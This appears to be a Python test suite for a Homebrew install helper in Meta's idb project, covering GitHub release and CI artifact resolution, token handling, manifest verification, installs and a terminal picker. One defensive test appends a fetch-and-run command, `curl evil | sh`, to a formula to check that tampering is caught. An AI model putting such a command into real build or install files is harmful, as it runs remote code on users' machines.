# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import hashlib
import io
import json
import subprocess
import tempfile
import unittest
import unittest.mock
import urllib.parse
import zipfile
from pathlib import Path

import homebrew
from homebrew import (
    API,
    Brew,
    CIRun,
    Context,
    GitHub,
    HomebrewError,
    Picker,
    Release,
    Response,
    Row,
    Tab,
)

REPO_API = f"{API}/repos/facebook/idb"
RUNNER_ASSETS = "file:///Users/runner/work/idb/idb/assets"
COMPANION = "idb-companion.macos-arm64.tar.gz"
WHEEL = "fb_idb-0.0.0-py3-none-any.whl"


def json_response(data, status=200, headers=None):
    return Response(status, headers or {}, json.dumps(data).encode())


class FakeTransport:
    """Answers by URL, ignoring the query string, and records every request."""

    def __init__(self, routes):
        self.routes = routes
        self.requests = []

    def __call__(self, url, headers, follow_redirects):
        self.requests.append((url, dict(headers), follow_redirects))
        path = url.split("?")[0]
        if path not in self.routes:
            return json_response({"message": "Not Found"}, status=404)
        return self.routes[path]

    def query(self, path):
        for url, _, _ in self.requests:
            if url.split("?")[0] == path:
                return dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query))
        raise AssertionError(f"{path} was not requested")


def formula(name, asset_base):
    asset = COMPANION if name == "idb-companion" else WHEEL
    return f'class Idb < Formula\n  url "{asset_base}/{asset}"\nend\n# {name}\n'


def rendered(asset_base):
    formulae = {f"{n}.rb": formula(n, asset_base) for n in homebrew.FORMULAE}
    manifest = {
        "tag": "v0.0.0",
        "asset_base": asset_base,
        "outputs": {
            n: hashlib.sha256(t.encode()).hexdigest() for n, t in formulae.items()
        },
    }
    return formulae, manifest


def zipped(files):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buffer.getvalue()


def release_json(tag="v1.6.2", published_at="2026-09-01T00:00:00Z", draft=False):
    return {
        "tag_name": tag,
        "draft": draft,
        "prerelease": False,
        "published_at": published_at,
        "html_url": f"https://github.com/facebook/idb/releases/tag/{tag}",
    }


def stable_route(carried="v1.6.2"):
    return {homebrew.STABLE_MANIFEST_URL: json_response({"tag": carried})}


def run_json(run_id=42, sha="a" * 40, path=homebrew.CI_WORKFLOW_PATH):
    return {
        "id": run_id,
        "head_sha": sha,
        "head_branch": "main",
        "event": "push",
        "pull_requests": [],
        "created_at": "2026-09-20T12:00:00Z",
        "html_url": f"https://github.com/facebook/idb/actions/runs/{run_id}",
        "display_title": "Some change",
        "path": path,
        "name": "CI",
        "status": "completed",
        "conclusion": "success",
    }


def runs_json(*runs):
    return {"workflow_runs": list(runs)}


def artifacts_json(run_id, names, expired=()):
    return {
        "artifacts": [
            {
                "name": n,
                "expired": n in expired,
                "archive_download_url": f"{REPO_API}/actions/artifacts/{run_id}{n}/zip",
            }
            for n in names
        ]
    }


def release_routes(tag="v1.6.2", carried="v1.6.2"):
    return {
        f"{REPO_API}/releases/tags/{tag}": json_response(release_json(tag)),
        **stable_route(carried),
    }


def ci_routes(run_id=42, artifacts=("formulae", "idb-companion", "fb-idb-dist")):
    formulae, manifest = rendered(RUNNER_ASSETS)
    contents = {
        "formulae": {**formulae, homebrew.CI_MANIFEST: json.dumps(manifest)},
        "idb-companion": {COMPANION: b"tarball", f"{COMPANION}.sha256": "abc"},
        "fb-idb-dist": {WHEEL: b"wheel"},
    }
    routes = {
        f"{REPO_API}/actions/runs/{run_id}": json_response(run_json(run_id)),
        f"{REPO_API}/actions/runs/{run_id}/artifacts": json_response(
            artifacts_json(run_id, artifacts)
        ),
    }
    for name in artifacts:
        blob = f"https://blob.example/{run_id}/{name}.zip?sig=secret"
        routes[f"{REPO_API}/actions/artifacts/{run_id}{name}/zip"] = Response(
            302, {"location": blob}, b""
        )
        routes[blob.split("?")[0]] = Response(200, {}, zipped(contents[name]))
    return routes


class FakeBrew:
    """A `brew` whose repository, prefix and cellar live in a temporary
    directory; commands that change installs are recorded, not run."""

    def __init__(self, root):
        self.root = Path(root)
        self.calls = []
        self.stable_version = "1.6.2"  # what its meta/fb clone resolves
        for name in ("repository", "prefix/opt", "cellar"):
            (self.root / name).mkdir(parents=True)

    def clone_tap(self, name):
        user, repository = name.split("/")
        taps = self.root / "repository" / "Library" / "Taps"
        (taps / user / f"homebrew-{repository}").mkdir(parents=True)

    def install_keg(self, name, version, tap):
        keg = self.root / "cellar" / name / version
        keg.mkdir(parents=True)
        (keg / "INSTALL_RECEIPT.json").write_text(json.dumps({"source": {"tap": tap}}))
        (self.root / "prefix" / "opt" / name).symlink_to(keg)

    def __call__(self, argv, capture_output=False, text=False):
        args = argv[1:]
        paths = {
            "--repository": "repository",
            "--prefix": "prefix",
            "--cellar": "cellar",
        }
        if args[0] in paths:
            return subprocess.CompletedProcess(
                argv, 0, str(self.root / paths[args[0]]), ""
            )
        if args[:2] == ["info", "--json=v2"]:
            info = {"formulae": [{"versions": {"stable": self.stable_version}}]}
            return subprocess.CompletedProcess(argv, 0, json.dumps(info), "")
        self.calls.append(args)
        return subprocess.CompletedProcess(argv, 0, "", "")

    def brew(self):
        return Brew(
            run=self, which=lambda _: "/opt/homebrew/bin/brew", log=lambda _: None
        )

    @property
    def tap_dir(self):
        return self.root / "repository" / homebrew.TAP_PATH


class TestCase(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.temp = Path(temp.name)
        self.fake_brew = FakeBrew(self.temp / "brew")
        self.logs = []

    def context(self, routes, token="token", confirm=lambda _: False):
        self.transport = FakeTransport(routes)
        return Context(
            github=GitHub(token, self.transport),
            brew=self.fake_brew.brew(),
            cache=self.temp / "cache",
            confirm=confirm,
            log=self.logs.append,
        )


class ResolveTests(TestCase):
    def github(self, routes):
        self.transport = FakeTransport(routes)
        return GitHub("token", self.transport)

    def test_a_tag_is_a_release(self):
        build = homebrew.resolve(self.github(release_routes()), "v1.6.2")
        self.assertIsInstance(build, Release)
        self.assertEqual(build.tag, "v1.6.2")

    def test_latest_is_the_newest_release(self):
        github = self.github(
            {f"{REPO_API}/releases/latest": json_response(release_json("v1.7.0"))}
        )
        self.assertEqual(homebrew.resolve(github, "latest").tag, "v1.7.0")

    def test_an_unknown_tag_is_reported(self):
        with self.assertRaisesRegex(HomebrewError, "no release is tagged v9.9.9"):
            homebrew.resolve(self.github({}), "v9.9.9")

    def test_run_id(self):
        build = homebrew.resolve(self.github(ci_routes(run_id=7)), "run:7")
        self.assertIsInstance(build, CIRun)
        self.assertEqual(build.id, 7)

    def test_a_run_of_another_workflow_is_refused(self):
        routes = {
            f"{REPO_API}/actions/runs/7": json_response(
                run_json(7, path=".github/workflows/release.yml")
            )
        }
        with self.assertRaisesRegex(HomebrewError, "not a CI"):
            homebrew.resolve(self.github(routes), "run:7")

    def test_a_malformed_run_is_refused(self):
        with self.assertRaisesRegex(HomebrewError, "expected run:<number>"):
            homebrew.resolve(self.github({}), "run:abc")

    def test_pull_request_resolves_through_its_head(self):
        sha = "b" * 40
        github = self.github(
            {
                f"{REPO_API}/pulls/12": json_response({"head": {"sha": sha}}),
                f"{REPO_API}/actions/workflows/ci.yml/runs": json_response(
                    runs_json(run_json(99, sha))
                ),
            }
        )
        self.assertEqual(homebrew.resolve(github, "pr:12").id, 99)
        query = self.transport.query(f"{REPO_API}/actions/workflows/ci.yml/runs")
        self.assertEqual(query["head_sha"], sha)
        self.assertEqual(query["status"], "success")

    def test_a_short_sha_is_expanded_before_looking_up_runs(self):
        sha = "c" * 40
        github = self.github(
            {
                f"{REPO_API}/commits/ccccccc": json_response({"sha": sha}),
                f"{REPO_API}/actions/workflows/ci.yml/runs": json_response(
                    runs_json(run_json(5, sha))
                ),
            }
        )
        self.assertEqual(homebrew.resolve(github, "ccccccc").id, 5)
        query = self.transport.query(f"{REPO_API}/actions/workflows/ci.yml/runs")
        self.assertEqual(query["head_sha"], sha)

    def test_a_commit_without_a_passing_run_is_reported(self):
        github = self.github(
            {
                f"{REPO_API}/commits/ccccccc": json_response({"sha": "c" * 40}),
                f"{REPO_API}/actions/workflows/ci.yml/runs": json_response(runs_json()),
            }
        )
        with self.assertRaisesRegex(HomebrewError, "no successful CI run for ccccccc"):
            homebrew.resolve(github, "ccccccc")

    def test_anything_else_is_a_branch(self):
        github = self.github(
            {
                f"{REPO_API}/actions/workflows/ci.yml/runs": json_response(
                    runs_json(run_json(3))
                )
            }
        )
        self.assertEqual(homebrew.resolve(github, "my-branch").id, 3)
        query = self.transport.query(f"{REPO_API}/actions/workflows/ci.yml/runs")
        self.assertEqual(query["branch"], "my-branch")


class GitHubTests(TestCase):
    def test_artifact_redirect_is_followed_without_the_token(self):
        routes = ci_routes()
        transport = FakeTransport(routes)
        github = GitHub("secret-token", transport)
        artifact = github.artifacts(42)["formulae"]
        github.download_artifact(artifact)
        api_request, blob_request = transport.requests[-2:]
        self.assertEqual(api_request[1]["Authorization"], "Bearer secret-token")
        self.assertFalse(api_request[2])
        self.assertTrue(blob_request[0].startswith("https://blob.example/"))
        self.assertNotIn("Authorization", blob_request[1])

    def test_an_artifact_redirect_without_a_location_is_reported(self):
        routes = ci_routes()
        routes[f"{REPO_API}/actions/artifacts/42formulae/zip"] = Response(302, {}, b"")
        github = GitHub("secret-token", FakeTransport(routes))
        with self.assertRaisesRegex(HomebrewError, "HTTP 302 without a Location"):
            github.download_artifact(github.artifacts(42)["formulae"])

    def test_artifacts_need_a_token(self):
        github = GitHub(None, FakeTransport(ci_routes()))
        with self.assertRaisesRegex(HomebrewError, "needs a GitHub token"):
            github.download_artifact(github.artifacts(42)["formulae"])

    def test_an_exhausted_rate_limit_suggests_a_token(self):
        routes = {
            f"{REPO_API}/releases": json_response(
                {"message": "API rate limit exceeded"},
                status=403,
                headers={"x-ratelimit-remaining": "0"},
            )
        }
        with self.assertRaisesRegex(HomebrewError, "rate limit"):
            GitHub(None, FakeTransport(routes)).releases(5)

    def test_token_prefers_the_environment(self):
        def run(*args, **kwargs):
            raise AssertionError("gh should not be asked")

        token = homebrew.github_token({"GH_TOKEN": "env"}, run, lambda _: "/bin/gh")
        self.assertEqual(token, "env")

    def test_token_falls_back_to_gh(self):
        def run(argv, **kwargs):
            self.assertEqual(argv, ["gh", "auth", "token"])
            return subprocess.CompletedProcess(argv, 0, "from-gh\n", "")

        self.assertEqual(homebrew.github_token({}, run, lambda _: "/bin/gh"), "from-gh")
        self.assertIsNone(homebrew.github_token({}, run, lambda _: None))


class VerifyTests(TestCase):
    def test_matching_formulae_pass(self):
        formulae, manifest = rendered(RUNNER_ASSETS)
        homebrew.verify(manifest, formulae)

    def test_a_tampered_formula_is_refused(self):
        formulae, manifest = rendered(RUNNER_ASSETS)
        formulae["idb-cli.rb"] += "system 'curl evil | sh'\n"
        with self.assertRaisesRegex(HomebrewError, "idb-cli.rb does not match"):
            homebrew.verify(manifest, formulae)

    def test_a_missing_formula_is_refused(self):
        formulae, manifest = rendered(RUNNER_ASSETS)
        del formulae["idb-companion.rb"]
        with self.assertRaisesRegex(HomebrewError, "idb-companion.rb is missing"):
            homebrew.verify(manifest, formulae)


class RepointTests(TestCase):
    def test_runner_paths_become_the_downloaded_assets(self):
        assets = self.temp / "assets dir"
        assets.mkdir()
        (assets / COMPANION).write_bytes(b"")
        (assets / WHEEL).write_bytes(b"")
        formulae, _ = rendered(RUNNER_ASSETS)
        result = homebrew.repoint(formulae, RUNNER_ASSETS, assets)
        for text in result.values():
            self.assertNotIn(RUNNER_ASSETS, text)
        self.assertIn(f'"{(assets / COMPANION).as_uri()}"', result["idb-companion.rb"])
        self.assertIn(f'"{(assets / WHEEL).as_uri()}"', result["idb-cli.rb"])

    def test_an_asset_the_build_lacks_is_reported(self):
        assets = self.temp / "assets"
        assets.mkdir()
        (assets / COMPANION).write_bytes(b"")
        formulae, _ = rendered(RUNNER_ASSETS)
        with self.assertRaisesRegex(HomebrewError, f"references {WHEEL}"):
            homebrew.repoint(formulae, RUNNER_ASSETS, assets)


class InstallTests(TestCase):
    def test_a_release_installs_from_meta_fb_without_the_local_tap(self):
        homebrew.install(self.context(release_routes()), "v1.6.2")
        self.assertEqual(
            self.fake_brew.calls,
            [
                ["tap", "meta/fb"],
                ["install", "meta/fb/idb-companion", "meta/fb/idb-cli"],
            ],
        )
        self.assertFalse(self.fake_brew.tap_dir.exists())

    def test_a_release_meta_fb_does_not_carry_is_refused(self):
        ctx = self.context(release_routes("v1.6.1", carried="v1.6.2"))
        with self.assertRaisesRegex(HomebrewError, "meta/fb carries v1.6.2"):
            homebrew.install(ctx, "v1.6.1")
        self.assertEqual(self.fake_brew.calls, [])

    def test_a_stale_clone_of_meta_fb_installs_nothing(self):
        self.fake_brew.stable_version = "1.6.1"
        with self.assertRaisesRegex(HomebrewError, "run `brew update`"):
            homebrew.install(self.context(release_routes()), "v1.6.2")
        self.assertEqual(self.fake_brew.calls, [["tap", "meta/fb"]])

    def test_a_release_leaves_meta_fb_installs_for_brew_to_upgrade(self):
        for name in homebrew.FORMULAE:
            self.fake_brew.install_keg(name, "1.6.1", "meta/fb")

        def confirm(_):
            raise AssertionError("upgrading meta/fb's own install should not ask")

        homebrew.install(self.context(release_routes(), confirm=confirm), "v1.6.2")
        self.assertEqual(
            self.fake_brew.calls[1:],
            [["install", "meta/fb/idb-companion", "meta/fb/idb-cli"]],
        )

    def test_a_clone_not_yet_renamed_installs_as_facebook_fb(self):
        self.fake_brew.clone_tap("facebook/fb")
        for name in homebrew.FORMULAE:
            self.fake_brew.install_keg(name, "1.6.1", "facebook/fb")

        def confirm(_):
            raise AssertionError("upgrading the clone's own install should not ask")

        homebrew.install(self.context(release_routes(), confirm=confirm), "v1.6.2")
        self.assertEqual(
            self.fake_brew.calls,
            [
                ["tap", "facebook/fb"],
                ["install", "facebook/fb/idb-companion", "facebook/fb/idb-cli"],
            ],
        )

    def test_a_renamed_clone_replaces_an_install_from_facebook_fb(self):
        # brew refuses to install a formula over a keg from another tap.
        self.fake_brew.clone_tap("meta/fb")
        self.fake_brew.install_keg("idb-cli", "1.6.1", "facebook/fb")
        questions = []

        def agree(question):
            questions.append(question)
            return True

        ctx = self.context(release_routes(), confirm=agree)
        homebrew.install(ctx, "v1.6.2", only="cli")
        self.assertEqual(questions, ["Replace idb-cli 1.6.1 (facebook/fb)?"])
        self.assertEqual(
            self.fake_brew.calls[1:],
            [
                ["uninstall", "--ignore-dependencies", "idb-cli"],
                ["install", "meta/fb/idb-cli"],
            ],
        )

    def test_a_release_replaces_local_builds_without_asking(self):
        self.fake_brew.install_keg("idb-cli", "0.0.0", homebrew.TAP)
        self.fake_brew.install_keg("idb-companion", "0.0.0", homebrew.TAP)
        homebrew.install(self.context(release_routes()), "v1.6.2")
        self.assertEqual(
            self.fake_brew.calls[1:],
            [
                ["uninstall", "--ignore-dependencies", "idb-companion", "idb-cli"],
                ["install", "meta/fb/idb-companion", "meta/fb/idb-cli"],
            ],
        )

    def test_a_ci_build_points_at_the_downloaded_assets(self):
        ctx = self.context(ci_routes())
        homebrew.install(ctx, "run:42")
        assets = (ctx.cache / "ci-42" / "assets").resolve()
        cli = (self.fake_brew.tap_dir / "Formula" / "idb-cli.rb").read_text()
        self.assertIn((assets / WHEEL).as_uri(), cli)
        self.assertNotIn(RUNNER_ASSETS, cli)
        record = json.loads((self.fake_brew.tap_dir / "build.json").read_text())
        self.assertEqual(record["kind"], "ci")
        self.assertEqual(record["run_id"], 42)
        self.assertEqual(record["commit"], "a" * 40)

    def test_a_run_without_the_wheel_is_reported(self):
        ctx = self.context(ci_routes(artifacts=("formulae", "idb-companion")))
        with self.assertRaisesRegex(HomebrewError, "no usable fb-idb-dist artifact"):
            homebrew.install(ctx, "run:42")
        self.assertEqual(self.fake_brew.calls, [])

    def test_replacing_a_meta_fb_install_needs_confirmation(self):
        for name in homebrew.FORMULAE:
            self.fake_brew.install_keg(name, "1.6.2", "meta/fb")
        questions = []

        def decline(question):
            questions.append(question)
            return False

        with self.assertRaisesRegex(HomebrewError, "left the installed"):
            homebrew.install(self.context(ci_routes(), confirm=decline), "run:42")
        self.assertEqual(len(questions), 1)
        self.assertIn("idb-cli 1.6.2 (meta/fb)", questions[0])
        self.assertEqual(self.fake_brew.calls, [])
        self.assertFalse(self.fake_brew.tap_dir.exists())

    def test_a_confirmed_replacement_removes_the_metapackage_too(self):
        for name in homebrew.FORMULAE:
            self.fake_brew.install_keg(name, "1.6.2", "meta/fb")
        homebrew.install(self.context(ci_routes(), confirm=lambda _: True), "run:42")
        self.assertEqual(
            self.fake_brew.calls[1],
            ["uninstall", "--ignore-dependencies", "idb", "idb-companion", "idb-cli"],
        )

    def test_yes_replaces_without_asking(self):
        self.fake_brew.install_keg("idb-cli", "1.6.2", "meta/fb")

        def confirm(_):
            raise AssertionError("--yes should not ask")

        ctx = self.context(ci_routes(), confirm=confirm)
        homebrew.install(ctx, "run:42", only="cli", assume_yes=True)
        self.assertEqual(
            self.fake_brew.calls[1:],
            [
                ["uninstall", "--ignore-dependencies", "idb-cli"],
                ["install", "idb-local/builds/idb-cli"],
            ],
        )

    def test_replacing_an_earlier_local_build_does_not_ask(self):
        self.fake_brew.install_keg("idb-cli", "0.0.0", homebrew.TAP)
        self.fake_brew.install_keg("idb-companion", "0.0.0", homebrew.TAP)
        homebrew.install(self.context(ci_routes()), "run:42")
        self.assertEqual(
            self.fake_brew.calls[1][:2], ["uninstall", "--ignore-dependencies"]
        )


class StatusTests(TestCase):
    def test_reports_each_formula_and_the_local_build(self):
        ctx = self.context(ci_routes())
        homebrew.install(ctx, "run:42")
        self.fake_brew.install_keg("idb-companion", "0.0.0", homebrew.TAP)
        self.fake_brew.install_keg("idb-cli", "0.0.0", homebrew.TAP)
        report = homebrew.status(ctx)
        self.assertEqual(
            report["formulae"],
            {
                "idb-companion": {"version": "0.0.0", "tap": homebrew.TAP},
                "idb-cli": {"version": "0.0.0", "tap": homebrew.TAP},
                "idb": None,
            },
        )
        self.assertEqual(report["build"]["run_id"], 42)
        text = homebrew.format_status(report)
        self.assertIn("CI run 42 of aaaaaaaaaa (main)", text)
        self.assertIn("idb            not installed", text)

    def test_the_local_build_is_not_reported_for_a_stable_install(self):
        self.fake_brew.tap_dir.mkdir(parents=True)
        (self.fake_brew.tap_dir / "build.json").write_text("{}")
        self.fake_brew.install_keg("idb-cli", "1.6.2", "meta/fb")
        report = homebrew.status(self.context({}))
        self.assertEqual(report["formulae"]["idb-cli"]["tap"], "meta/fb")
        self.assertIsNone(report["build"])


class UninstallTests(TestCase):
    def test_removes_local_builds_and_restores_the_stable_formula(self):
        self.fake_brew.install_keg("idb-cli", "0.0.0", homebrew.TAP)
        self.fake_brew.install_keg("idb-companion", "1.6.2", "meta/fb")
        self.fake_brew.tap_dir.mkdir(parents=True)
        homebrew.uninstall(self.context({}), restore=True)
        self.assertEqual(
            self.fake_brew.calls,
            [
                ["uninstall", "--ignore-dependencies", "idb-cli"],
                ["install", "meta/fb/idb"],
            ],
        )
        self.assertFalse(self.fake_brew.tap_dir.exists())

    def test_restoring_uses_a_clone_not_yet_renamed(self):
        self.fake_brew.clone_tap("facebook/fb")
        homebrew.uninstall(self.context({}), restore=True)
        self.assertEqual(self.fake_brew.calls, [["install", "facebook/fb/idb"]])


class BuildsTests(TestCase):
    def test_ci_rows_say_why_a_run_cannot_be_installed(self):
        routes = {
            f"{REPO_API}/actions/workflows/ci.yml/runs": json_response(
                runs_json(run_json(1), run_json(2), run_json(3))
            ),
            f"{REPO_API}/actions/runs/1/artifacts": json_response(
                artifacts_json(1, ("formulae", "idb-companion", "fb-idb-dist"))
            ),
            f"{REPO_API}/actions/runs/2/artifacts": json_response(
                artifacts_json(2, ("formulae", "idb-companion"))
            ),
            f"{REPO_API}/actions/runs/3/artifacts": json_response(
                artifacts_json(
                    3,
                    ("formulae", "idb-companion", "fb-idb-dist"),
                    expired=("formulae",),
                )
            ),
        }
        rows = homebrew.ci_rows(GitHub(None, FakeTransport(routes)), 3, branch="main")
        self.assertEqual(
            [(r.spec, r.installable, r.note) for r in rows],
            [
                ("run:1", True, ""),
                ("run:2", False, "missing fb-idb-dist"),
                ("run:3", False, "artifacts expired"),
            ],
        )

    def test_release_rows_offer_only_the_release_meta_fb_carries(self):
        routes = {
            f"{REPO_API}/releases": json_response(
                [
                    release_json("v1.7.0", published_at="2026-09-23T00:00:00Z"),
                    release_json("v1.6.2", published_at="2026-09-17T00:00:00Z"),
                ]
            ),
            **stable_route("v1.6.2"),
        }
        rows = homebrew.release_rows(GitHub(None, FakeTransport(routes)), 2)
        self.assertEqual(
            [(r.spec, r.installable, r.note) for r in rows],
            [("v1.7.0", False, "meta/fb carries v1.6.2"), ("v1.6.2", True, "")],
        )

    def test_release_rows_skip_drafts_and_list_newest_first(self):
        routes = {
            f"{REPO_API}/releases": json_response(
                [
                    release_json("v1.1.7", published_at=None, draft=True),
                    release_json("v1.6.1", published_at="2026-09-18T00:00:00Z"),
                    release_json("v1.6.2", published_at="2026-09-23T00:00:00Z"),
                    release_json("v1.6.0", published_at="2026-09-17T00:00:00Z"),
                ]
            ),
            **stable_route(),
        }
        rows = homebrew.release_rows(GitHub(None, FakeTransport(routes)), 2)
        self.assertEqual([r.spec for r in rows], ["v1.6.2", "v1.6.1"])


class PickerTests(unittest.TestCase):
    def picker(self):
        return Picker(
            [
                Tab(
                    "Releases",
                    [
                        Row("v1.7.0", ("v1.7.0",), True),
                        Row("v1.6.2", ("v1.6.2",), True),
                    ],
                ),
                Tab("CI", [Row("run:1", ("run:1",), False, "artifacts expired")]),
            ]
        )

    def test_cursor_stays_within_the_rows(self):
        picker = self.picker()
        picker.handle("KEY_UP")
        self.assertEqual(picker.tab.cursor, 0)
        picker.handle("KEY_DOWN")
        picker.handle("KEY_DOWN")
        self.assertEqual(picker.tab.cursor, 1)

    def test_enter_installs_the_selected_build(self):
        picker = self.picker()
        picker.handle("j")
        self.assertEqual(picker.handle("\n"), ("install", "v1.6.2"))

    def test_tab_switches_and_keeps_each_cursor(self):
        picker = self.picker()
        picker.handle("KEY_DOWN")
        picker.handle("\t")
        self.assertEqual(picker.tab.title, "CI")
        picker.handle("\t")
        self.assertEqual(picker.tab.cursor, 1)

    def test_an_uninstallable_build_explains_itself(self):
        picker = self.picker()
        picker.handle("\t")
        self.assertIsNone(picker.handle("\n"))
        self.assertIn("artifacts expired", picker.message)

    def test_enter_on_an_empty_tab_does_nothing(self):
        picker = Picker([Tab("Releases")])
        self.assertIsNone(picker.handle("\n"))
        picker.handle("KEY_DOWN")
        self.assertEqual(picker.tab.cursor, 0)

    def test_actions(self):
        picker = self.picker()
        self.assertEqual(picker.handle("q"), ("quit",))
        self.assertEqual(picker.handle("r"), ("refresh",))
        self.assertEqual(picker.handle("u"), ("uninstall",))
        self.assertEqual(picker.handle("p"), ("pull-request",))


class MainTests(TestCase):
    def test_errors_exit_nonzero_with_a_message(self):
        ctx = self.context({})
        with unittest.mock.patch("sys.stderr", new_callable=io.StringIO) as stderr:
            self.assertEqual(homebrew.main(["install", "v9.9.9"], ctx), 1)
        self.assertIn("error: no release is tagged v9.9.9", stderr.getvalue())


if __name__ == "__main__":
    unittest.main()
